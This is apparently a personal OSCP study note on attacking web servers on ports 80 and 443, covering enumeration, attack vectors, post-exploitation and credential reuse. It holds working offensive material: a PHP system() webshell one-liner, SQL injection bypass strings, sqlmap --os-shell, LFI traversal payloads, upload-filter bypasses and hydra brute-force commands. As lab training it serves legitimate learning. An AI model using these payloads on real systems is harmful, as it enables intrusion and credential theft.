# 🌐 HTTP / HTTPS — Ports 80 / 443 (+ 8080, 8000, 8443, 8888…)

> The **single largest OSCP attack surface**. Most exam boxes fall through a web app. Web enumeration is deep and time-consuming, so this note is a discipline: enumerate broadly, then drill the one lead that looks alive.

Related: [[Web Enumeration]] · [[Shells]] · [[Credential Attacks]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]]

---

## 🧠 PORT 80/443 → THINK

- **What's the stack?** (`whatweb`, headers, favicon) — Apache/Nginx/IIS? PHP/ASP.NET/Java? WordPress/Joomla/Drupal/Tomcat?
- **Vhosts / domains?** A hostname in a cert or redirect → add to `/etc/hosts`, fuzz vhosts.
- **Hidden content?** Always `feroxbuster`/`gobuster` for dirs & files, with extensions.
- **CMS?** → the matching scanner (`wpscan`, `droopescan`, `joomscan`) + known-plugin CVEs.
- **Login page?** default creds, SQLi, brute, register.
- **Upload / file param?** upload webshell, LFI/RFI, path traversal.
- **Input reflected?** SQLi / command injection / SSTI / XSS-to-something.
- **443?** read the **certificate** for hostnames/emails/usernames.
- **Admin panel / known app?** searchsploit the exact product + version.

---

## ⚡ QUICK TRIAGE (verdict in 2 minutes)

```bash
export IP=10.10.10.10 URL=http://$IP
```

```bash
whatweb $URL                                   # stack fingerprint
```

```bash
curl -sI $URL                                  # headers: Server, X-Powered-By, redirects
```

```bash
curl -s $URL | head -50                        # raw HTML: comments, forms, JS paths
```
Open the site in a browser. **View source.** Note: framework, CMS, login forms, upload forms, any version string, any hostname in a redirect/cert.

**Verdict:** known CMS/app → searchsploit it now. Custom app → dir-bust + test every input. Default page ("It works!"/IIS) → vhost fuzz + dir-bust harder; the real app may be on a vhost or a path.

---

## ⏱️ 5-MINUTE ENUMERATION

```bash
# Fingerprint
whatweb -a3 $URL ; curl -sI $URL
```

```bash
# Look at the actual page + source
curl -s $URL | grep -iE 'href|src|action|comment|<!--|version|generator'
```

```bash
# Directory & file brute (kick off, let it run while you look manually)
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -t 50
```

```bash
# Always-check files
for f in robots.txt sitemap.xml .git/HEAD .htaccess config.php phpinfo.php server-status; do
  echo "== $f =="; curl -s -o /dev/null -w "%{http_code}\n" $URL/$f; done
```

```bash
# If HTTPS — read the cert for names
echo | openssl s_client -connect $IP:443 2>/dev/null | openssl x509 -noout -subject -issuer -ext subjectAltName
```

**Look for:** `200`/`301`/`403` on interesting paths (403 = it exists, dig), version strings, `robots.txt` disallow entries, comments in HTML, hostnames in the cert.

---

## 🔬 15–30 MINUTE DEEP ENUMERATION

```bash
# 1) Recursive + extension-aware content discovery
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,old,7z,sql -r -t 50 -o ferox.txt
```

```bash
# 2) Virtual host / subdomain fuzzing (needs a base domain — from cert/redirect)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://$IP/ -H "Host: FUZZ.target.htb" -fs <size-of-default-response>
```

```bash
# 3) Parameter fuzzing on a script that takes input
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "$URL/page.php?FUZZ=test" -fs <baseline>
```

```bash
# 4) CMS-specific
wpscan --url $URL --enumerate ap,at,u --api-token <token>     # WordPress
```

```bash
droopescan scan drupal -u $URL                                # Drupal
```

```bash
joomscan --url $URL                                           # Joomla
```

```bash
# 5) Nikto (broad misconfig sweep — noisy, run in background)
nikto -h $URL -o nikto.txt
```

> **Vhost fuzzing is the #1 missed step.** If the default page is generic, the real app is often served only when you send the right `Host:` header. Add discovered names to `/etc/hosts` (`echo "$IP name.htb" | sudo tee -a /etc/hosts`).

---

## 📖 WHAT — the service

- **Purpose:** serve web content/apps over HTTP(S).
- **Ports:** 80 (HTTP), 443 (HTTPS/TLS). Alternates: 8080/8000/8888 (dev/proxy), 8443 (HTTPS alt), 5000/3000 (app frameworks). **Scan them all** — apps hide on high ports.
- **Servers:** Apache, Nginx, **IIS** (→ Windows/ASP.NET), Tomcat (Java, port 8080), Node/Express, lighttpd.
- **App layers:** PHP, ASP.NET (`.aspx`), Java (`.jsp`, `.do`), Python, Ruby; CMS (WordPress/Joomla/Drupal), panels (phpMyAdmin, Tomcat Manager, Jenkins, Grafana).
- **Auth:** form login (cookies/JWT), HTTP Basic/Digest (`401 WWW-Authenticate`), NTLM (IIS), API keys/tokens.
- **Attack surface:** hidden dirs/files, source/backup leaks, CMS/plugin CVEs, injection (SQLi/cmdi/SSTI/LFI/XXE), file upload, auth bypass, IDOR, default creds, exposed admin/dev interfaces.

## 💡 WHY — why it matters in OSCP

- Most common **initial access** vector: webshell upload, RCE via injection, CMS/plugin exploit, or known-app CVE.
- Rich **credential source**: config files, backups, `.git`, source disclosure, DB connection strings.
- The **extension tells the OS**: `.php`→likely Linux, `.aspx`→Windows/IIS. Steers privesc.
- Feeds every other service: creds found on web → reuse on SSH/SMB/DB/RDP ([[Credential Attacks]]).

---

## 🔎 HOW: MANUAL ENUMERATION

### Fingerprint the stack
```bash
whatweb -a3 $URL
```

```bash
curl -sI $URL                       # Server, X-Powered-By, Set-Cookie (PHPSESSID/JSESSIONID/ASP.NET_SessionId)
```

```bash
curl -s $URL | grep -i generator    # CMS meta generator tag
```
- **Cookie tells language:** `PHPSESSID`→PHP, `JSESSIONID`→Java, `ASP.NET_SessionId`→.NET, `connect.sid`→Node.

### Read the page like a human
- **View source** for HTML comments, dev notes, credentials, hidden fields, JS files.
- Pull and read every **JS file** — endpoints, API routes, keys, hidden params.
- `robots.txt`, `sitemap.xml` — dev's own list of paths they didn't want indexed.

### TLS certificate (443)
```bash
echo | openssl s_client -connect $IP:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject:\|DNS:'
```
- **CN/SAN → hostnames** (add to `/etc/hosts`), emails → usernames, internal domain → vhost fuzz targets.

### Manual content discovery
- Guess by app logic: `/admin`, `/login`, `/dashboard`, `/api`, `/backup`, `/dev`, `/uploads`, `/.git/`.

## 🤖 HOW: AUTOMATED ENUMERATION

```bash
# Directory/file brute (pick one; feroxbuster recurses by default)
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak
```

```bash
gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 50
```

```bash
# Misconfig / known files
nikto -h $URL
```

```bash
# Vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $URL/ -H "Host: FUZZ.domain.tld" -fs <baseline>
```

```bash
# Nuclei (templated CVE/misconfig scan; great signal on modern Kali)
nuclei -u $URL
```
> **Wordlist choice matters.** `raft-medium`/`directory-list-2.3-medium` for dirs; add `-x` extensions matching the stack (`php` for PHP, `aspx` for IIS). If nothing found with medium, escalate to `-big`/`raft-large`.

---

## 🔐 AUTHENTICATION

- **Form login:** try default creds (admin/admin, admin/password, product defaults), SQLi bypass (`' or 1=1-- -`), register a user, password reset flaws.
- **HTTP Basic (`401`):** `hydra -L users -P pass $IP http-get /path`.
- **Brute a form:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
 "/login.php:user=^USER^&pass=^PASS^:F=incorrect"      # F = failure string
```
- **Default creds** for the identified product: search "`<product> default credentials`" and try `admin/admin`, `tomcat/tomcat`, `root/root`, etc.

---

## 👤 USER ENUMERATION

- Login/register/reset **error differences** ("user not found" vs "wrong password") → valid usernames.
- Author enumeration on CMS (`wpscan --enumerate u`, `/?author=1`).
- Emails/names in page content, comments, cert, `mailto:` links → userlist for [[Credential Attacks]].

## 📂 RESOURCE / FILE ENUMERATION

**Always-check high-value paths:**
```
robots.txt  sitemap.xml  .git/HEAD  .svn/  .htaccess  .htpasswd
config.php  configuration.php  web.config  wp-config.php  .env
backup.zip  backup.tar.gz  site.bak  db.sql  phpinfo.php
server-status  server-info  /admin  /manager/html (Tomcat)  /phpmyadmin
```
- **`.git` exposed:** dump the repo → source + secrets:
```bash
git-dumper $URL/.git/ ./loot-git      # or wget -r; then git log/checkout
```
- **Backup files** (`.bak`, `.old`, `~`, `.zip`, `.tar.gz`): source disclosure → creds & logic.
- **`.env` / `web.config` / `wp-config.php`:** DB creds, API keys, secrets.

## ⚙️ CONFIGURATION ENUMERATION

- **Directory listing enabled** (auto-index) → browse freely.
- **HTTP methods:** `curl -X OPTIONS -i $URL` → `PUT`/`DELETE` enabled? `PUT` a webshell.
- **Verbose errors / stack traces** → framework, paths, versions.
- **`phpinfo.php`** → full PHP config, paths, sometimes creds.
- **Default install pages / sample apps** → known-CVE targets.

---

## 🎯 VULNERABILITY IDENTIFICATION

```bash
searchsploit <product> <version>        # e.g. searchsploit tomcat 9.0
```

```bash
nuclei -u $URL                          # templated CVE/exposure scan
```
Match the exact product+version from `whatweb`/headers/cert. Version-specific RCEs are the fastest OSCP wins (e.g. Tomcat manager deploy, old Drupal *Drupalgeddon*, WordPress plugin RCEs, Jenkins script console).

---

## 🗡️ ATTACK VECTORS (labelled by probability)

### 🟢 HIGH PROB — Known app/CMS CVE
- Identify exact version → `searchsploit`/`nuclei` → run PoC. (Tomcat `/manager` deploy WAR, Drupalgeddon2, WP plugin RCE, Jenkins, phpMyAdmin.)

### 🟢 HIGH PROB — File upload → webshell
- Any upload (avatar, doc, import). Bypass filters: double ext (`shell.php.jpg`), case (`.pHp`), null/`.phtml`/`.php5`, `Content-Type` swap, magic bytes.
- Land it in a reachable dir → browse → RCE. Payloads: [[Shells]].
```bash
# PHP oneliner webshell:
echo '<?php system($_GET["c"]); ?>' > shell.php   # then $URL/uploads/shell.php?c=id
```

### 🟢 HIGH PROB — SQL injection
- Any param/login. Manual: `'`, `' or 1=1-- -`, `1' UNION SELECT ...`. Automated:
```bash
sqlmap -u "$URL/page.php?id=1" --batch --dbs
```

```bash
sqlmap -r request.txt --batch --dump         # from a saved Burp request (POST/cookies)
```
- **Wins:** auth bypass, data dump (creds!), `--os-shell`, read/write files (`--file-read`, `--file-write`).

### 🟢 HIGH PROB — LFI / path traversal
- `?file=../../../../etc/passwd`, `?page=`. Read source with php filter:
```
$URL/index.php?page=php://filter/convert.base64-encode/resource=config
```
- **LFI → RCE:** log poisoning (User-Agent into access log then include it), `/proc/self/environ`, PHP session files, or upload+include.

### 🟡 MED PROB — Command injection
- Params that feel like they run a command (ping, lookup, convert): `; id`, `| id`, `$(id)`, backticks, `%0a id`.

### 🟡 MED PROB — SSTI (template injection)
- Reflected `{{7*7}}`→`49` → engine-specific RCE (Jinja2/Twig/Freemarker). Confirm engine, then payload.

### 🟡 MED PROB — Default creds / exposed admin
- Tomcat Manager, Jenkins, phpMyAdmin, Grafana, printers → default creds → deploy/exec.

### 🔵 SITUATIONAL — XXE, SSRF, IDOR, deserialization, RFI
- XML input → XXE (file read/SSRF). `id`/object refs → IDOR. `url=`/`redirect=` → SSRF. `.NET ViewState`/Java serialized → deserialization RCE (ysoserial).

---

## 🔑 CREDENTIAL HUNTING

- Config/backup/`.env`/`.git`/`wp-config.php` → DB & app creds.
- Source disclosure (LFI/php filter/backup) → hardcoded creds, secrets.
- SQLi dump → user table (hashes → crack in [[Credential Attacks]]).
- HTML/JS comments, `phpinfo`, error pages.
- **Every cred → reuse** on SSH/SMB/DB/RDP and other web logins.

## 💥 EXPLOITATION → INITIAL ACCESS (flow)

```
Web app
 ├─ Known product+version? ─▶ searchsploit/nuclei ─▶ CVE PoC ─▶ RCE ✅
 ├─ Upload form? ─▶ bypass filter ─▶ webshell ─▶ reverse shell ✅
 ├─ Injectable param? ─▶ SQLi (dump/os-shell) | cmdi | SSTI | LFI→RCE ─▶ shell/creds ✅
 ├─ Login page? ─▶ default creds | SQLi bypass | brute ─▶ admin ─▶ upload/deploy ✅
 ├─ .git/backup/.env leak? ─▶ source+creds ─▶ reuse/logic bug ✅
 └─ Nothing? ─▶ vhost fuzz, deeper wordlist, high ports, re-read JS/source
```
Get a proper reverse shell → [[Shells]].

---

## 🧹 POST-EXPLOITATION (after webshell/RCE)

- **Upgrade the shell** (TTY) → [[Shells]].
- **Identify:** `id`/`whoami`, `hostname`, `uname -a`/`systeminfo`. Usually `www-data`/`iis apppool` — low priv.
- **Loot the webroot:** `wp-config.php`, `config.php`, `.env`, `web.config`, connection strings → DB creds → [[Credential Attacks]].
- **DB creds → login to DB** ([[MySQL]]/[[MSSQL]]); dump users; try `root`/`sa` reuse.
- **PrivEsc:** [[Linux Privilege Escalation]] (linpeas) or [[Windows Privilege Escalation]] (winpeas; `iis apppool` often has `SeImpersonate` → PrintSpoofer/GodPotato → SYSTEM).

---

## 🧗 PRIVILEGE ESCALATION CONNECTIONS

- `.php`/Apache → Linux → [[Linux Privilege Escalation]].
- `.aspx`/IIS → Windows, service account with `SeImpersonatePrivilege` → potato attacks → [[Windows Privilege Escalation]].
- Webroot DB creds → DB service → sometimes `xp_cmdshell`/UDF → SYSTEM/root.

---

## 🔁 FOUND → NEXT (decision table)

| FINDING | MEANING | NEXT ACTION | POSSIBLE RESULT | NEXT DECISION |
|---|---|---|---|---|
| Product + version | Known-CVE target | `searchsploit`/`nuclei` | working exploit | Run PoC → RCE |
| Upload form | Possible webshell | bypass filters, upload | code exec | Reverse shell |
| Param reflected in query | Injectable | test SQLi/cmdi/SSTI/LFI | dump/RCE | Exploit that class |
| Login page | Auth surface | default creds / SQLi / brute | admin access | Deploy/upload/loot |
| `.git`/backup/`.env` | Source/secret leak | git-dumper / download | creds+source | Reuse creds / find logic bug |
| 403 on a dir | Exists, forbidden | fuzz inside it, try bypass | hidden app | Enumerate deeper |
| Default page only | Real app elsewhere | vhost fuzz + high ports | new host/app | Enumerate that |
| Cert hostname | Vhost hint | add /etc/hosts, refuzz | new content | Full enum on vhost |
| CMS detected | Plugin/theme CVEs | wpscan/droopescan/joomscan | vuln plugin | Exploit it |
| DB creds in config | Reusable | login DB + spray | more data/creds | [[Credential Attacks]] |

---

## 🚧 FAILED → NEXT

| Symptom | Do this |
|---|---|
| Dir brute finds nothing | Change wordlist (raft-large/-big), add extensions matching stack, try trailing `/`, recurse, check case sensitivity |
| Only default server page | **Vhost fuzz** (Host header), scan high ports (8080/8443/3000/5000), re-read source/JS |
| Upload rejected | Try double ext, `.phtml/.php5/.phar`, case, Content-Type spoof, magic bytes, path traversal in filename |
| SQLi manual fails | `sqlmap` with saved Burp request, try different techniques (`--technique`), other params, cookies, headers |
| Login brute locks/slow | Check for lockout/CAPTCHA; try default creds & SQLi bypass instead |
| LFI blocked | php filters, wrappers (`data://`,`expect://`), null byte (old PHP), path truncation, log poisoning |
| `403` everywhere | Try method override, `X-Forwarded-For`/`X-Original-URL`, trailing chars, path fuzz within |
| Exploit PoC fails | Confirm exact version, fix LHOST/port/URI path, try another PoC/searchsploit result, use Burp to debug the request |

---

## 🛠️ TROUBLESHOOTING

- **Redirect to a hostname?** Add it to `/etc/hosts`, browse by name (vhost routing).
- **Weird sizes filtering out real hits in ffuf?** Set `-fs`/`-fc`/`-fw` from the baseline response.
- **HTTPS cert errors** in tools: add `-k`/`--insecure`.
- **Rate/WAF issues:** slow down (`-t`), change UA, use Burp to shape requests.
- **Burp:** proxy the app through it to see/replay every request; `Repeater` for injection, `Intruder` for light fuzzing.

## ⚠️ COMMON MISTAKES

- Not **fuzzing vhosts** when only a default page shows.
- Not scanning **alternate HTTP ports**.
- Ignoring **403** (it exists — enumerate inside/bypass).
- Not reading **JS files** and HTML **comments**.
- Dir-busting without the right **extensions** for the stack.
- Skipping the **certificate** on 443.
- Rabbit-holing on XSS/CSRF (rarely the OSCP path) instead of RCE/upload/SQLi/LFI.
- Forgetting to reuse discovered creds on other services.

---

## 🔗 CREDENTIAL REUSE

Web creds (DB, app, config) → test everywhere:
```bash
ssh user@$IP                               # 22
```

```bash
netexec smb  $IP -u user -p pass           # 445
```

```bash
netexec winrm $IP -u user -p pass          # 5985
```

```bash
mysql -u user -p'pass' -h $IP              # 3306
```

```bash
xfreerdp /u:user /p:pass /v:$IP            # 3389
```
Also reuse across other web logins/panels. See [[Credential Attacks]].

## 🌐 CROSS-SERVICE ATTACKS

- **Webroot config → DB service:** connection strings = DB creds for 3306/1433/5432.
- **`.git`/backup source → logic & secrets** used across the box.
- **Usernames from author/registration enum → SMB/Kerberos/SMTP** spraying/roasting.
- **Cert/redirect hostnames → [[DNS]] & vhosts** → more apps.
- **LFI file-read → SSH keys/`/etc/passwd`/tomcat-users.xml** → direct login on other services.

---

## 🧭 OSCP EXAM MINDSET

1. Fingerprint first — **the stack decides everything** (CVEs, upload types, privesc OS).
2. Broad then narrow: kick off dir/vhost brute, **read the site by hand** while it runs.
3. **Every input is a question**: is it SQLi? cmdi? SSTI? LFI? Test methodically, one class at a time.
4. Known product → **searchsploit before creativity**. Don't hand-roll what a public exploit already does.
5. A generic default page is a **signal to vhost-fuzz**, not to give up.
6. Web almost always yields **creds** — grab them and pivot; the web foothold is often just step one.

---

## ✅ DON'T MISS (checklist)

- [ ] `whatweb` + headers + cookies (stack & language)
- [ ] View **source** + read **JS files** + comments
- [ ] `robots.txt`, `sitemap.xml`, `.git/`, backups, `.env`, `phpinfo`
- [ ] Dir/file brute **with stack extensions**, recursive
- [ ] **Vhost/subdomain fuzz** (Host header) + `/etc/hosts`
- [ ] **Alternate HTTP ports** (8080/8443/3000/5000/8000/8888)
- [ ] **443 certificate** → hostnames/emails/usernames
- [ ] CMS scanner if CMS detected
- [ ] Test **every input**: SQLi / cmdi / SSTI / LFI / upload
- [ ] `searchsploit`/`nuclei` on exact product+version
- [ ] Loot creds → **reuse everywhere**

---

## 🛑 STOP CONDITION

Move on (temporarily) when:
- All paths dir-busted (with extensions, recursively) and vhosts fuzzed.
- Alt HTTP ports checked; cert read.
- Every input tested for SQLi/cmdi/SSTI/LFI/upload with no dice.
- Known-product CVEs exhausted (`searchsploit`/`nuclei` clean or PoCs fail after real effort).

Web is deep — before fully abandoning, re-read source/JS once more and confirm you didn't skip a vhost or high port. Keep any usernames/creds for reuse.

---

## 📇 EXAM CHEAT SHEET

```bash
export IP=10.10.10.10 URL=http://$IP
```

```bash
# Fingerprint
whatweb -a3 $URL ; curl -sI $URL ; curl -s $URL | head
```

```bash
# Content discovery
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -r
```

```bash
# Vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $URL/ -H "Host: FUZZ.dom.tld" -fs <baseline>
```

```bash
# Cert (443)
echo | openssl s_client -connect $IP:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'DNS:\|Subject:'
```

```bash
# CMS
wpscan --url $URL --enumerate ap,at,u ; droopescan scan drupal -u $URL ; joomscan --url $URL
```

```bash
# Known CVEs
searchsploit <product> <version> ; nuclei -u $URL
```

```bash
# Injection
sqlmap -u "$URL/p.php?id=1" --batch --dbs        # or -r request.txt --dump
```

```bash
# LFI test
curl "$URL/index.php?page=../../../../etc/passwd"
```

```bash
# Webshell (after upload)
echo '<?php system($_GET["c"]); ?>' > shell.php   # -> $URL/uploads/shell.php?c=id
```

**Sequence:** fingerprint → source/JS → dir+vhost brute → cert → CMS scan → test every input → searchsploit version → upload/inject → shell → loot creds → reuse.

**Kill shots:** version CVE, upload→webshell, SQLi (`--os-shell`/dump), LFI→RCE, default-cred admin→deploy.
